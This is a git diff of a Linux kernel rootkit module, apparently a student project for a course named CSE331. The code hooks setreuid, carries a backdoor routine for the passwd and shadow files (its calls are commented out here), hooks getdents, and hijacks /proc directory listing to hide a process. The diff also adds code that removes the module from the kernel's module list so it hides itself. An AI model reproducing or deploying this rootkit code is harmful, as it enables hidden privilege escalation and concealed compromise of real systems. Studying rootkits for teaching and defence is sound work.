@@ -9,15 +9,12 @@
 #include <asm/uaccess.h>
 #include <asm/unistd.h>
 #include <linux/dirent.h>
-
-
 #include <linux/init.h>
-#include <linux/kernel.h>
 #include <linux/namei.h>
 #include <linux/proc_fs.h>
 #include <linux/sched.h>
 #include <asm/current.h>
-
+#include <linux/kobject.h>
 
 
 
@@ -28,6 +25,7 @@ MODULE_DESCRIPTION("Rootkit Testfile for CSE331") ;
 MODULE_VERSION("0.3");
 
 void **sys_call_address; // Pointer to the sys_call_table	
+
 
 asmlinkage int (* old_setreuid) (uid_t ruid, uid_t euid);
 asmlinkage long our_setreuid(const struct pt_regs *regs){
@@ -53,7 +51,6 @@ asmlinkage long our_setreuid(const struct pt_regs *regs){
 }
 
 // Start Marc
-	
 void add_backdoor(char *path) {
 		struct file *file;
 		char *BACKDOOR;
@@ -220,34 +217,39 @@ asmlinkage int sys_getdents_hook(unsigned int fd, struct linux_dirent* dirp, uns
 // END BRIAN
 
 
-//START CARLOS	
-
+//START CARLOS
+//iterate takes pointer to dir_context	
+struct list_head *module_list;//reference to module_list. Used to hide mod from insmod
 static char *proc_to_hide = "1";
-static struct file_operations proc_fops;
-static struct file_operations *backup_proc_fops;
+static struct file_operations proc_fops;//pointers to listing contents in proc dir
+static struct file_operations *backup_proc_fops;//keep backup in order to restore orginal struct 
 static struct inode *proc_inode;
 static struct path p;
 
 struct dir_context *backup_ctx;
  
-static int rk_filldir_t(struct dir_context *ctx, const char *proc_name, int len, loff_t off, u64 ino, unsigned int d_type){
-    if (strncmp(proc_name, proc_to_hide, strlen(proc_to_hide)) == 0)
-        return 0;
+static int overwritten_filldir_t(struct dir_context *ctx, const char *proc_name, int len, loff_t off, u64 ino, unsigned int d_type){
+    //prints contents 
+    if (strncmp(proc_name, proc_to_hide, strlen(proc_to_hide)) == 0){
+	printk(KERN_INFO "@%@?: overwritte_filldir going into hiding");
+	return 0;
+    }
 
-    return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, d_type);
+    return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, d_type);//return orginal pointer to  dir_context.Prints it off.
 }
 
-struct dir_context rk_ctx = {
-    .actor = rk_filldir_t,
+struct dir_context hacked_ctx = {
+    .actor = overwritten_filldir_t,//Evil struct
 };
 
-int rk_iterate_shared(struct file *file, struct dir_context *ctx){
+//getdents() calls iterate_dir() which calls iterate_shared()
+int overwritten_iterate_shared(struct file *file, struct dir_context *ctx){
+    printk(KERN_INFO "@$@!: rk_iterate_shared"); 
     int result = 0;
-    rk_ctx.pos = ctx->pos;
+    hacked_ctx.pos = ctx->pos;
     backup_ctx = ctx;
-    result = backup_proc_fops->iterate_shared(file, &rk_ctx);
-    ctx->pos = rk_ctx.pos;
-
+    result = backup_proc_fops->iterate_shared(file, &hacked_ctx);
+    ctx->pos = hacked_ctx.pos;
     return result;
 }
 
@@ -268,8 +270,8 @@ static int __init rootkit_init(void){
 	
 	// Start Marc
 	
-	add_backdoor(PASSWD_FILE);
-   	add_backdoor(SHADOW_FILE);
+	//add_backdoor(PASSWD_FILE);
+   	//add_backdoor(SHADOW_FILE);
 	
 	// End Marc
 	
@@ -288,8 +290,11 @@ static int __init rootkit_init(void){
 	// End Brendan
 
 	//Start Carlos
+	module_list = THIS_MODULE->list.prev;//moves pointer
+    	list_del(&THIS_MODULE->list);//del the current pointer. Removes module from insmod.
 	printk(KERN_INFO "@$@?: The process is \"%s\" (pid %i)\n", current->comm, current->pid);
 	
+
 	if(kern_path("/proc", 0, &p)){
         	printk(KERN_INFO "@%@?: System forced to exit becaus path for /proc not found");
 		return 0;
@@ -299,7 +304,7 @@ static int __init rootkit_init(void){
 	proc_inode = p.dentry->d_inode;/*get the inode*/
     	proc_fops = *proc_inode->i_fop;/* get a copy of file_oprartions from inode*/
    	backup_proc_fops = proc_inode->i_fop;/* back up file_operation*/
-  	proc_fops.iterate_shared = rk_iterate_shared; /* modify copy without hijacked function */
+  	proc_fops.iterate_shared = overwritten_iterate_shared; /* modify copy without hijacked function */
    	proc_inode->i_fop = &proc_fops; /* overwrite the proc entry file operations */
 	printk(KERN_INFO "@$@?: Process in hiding");
 	//End Carlos
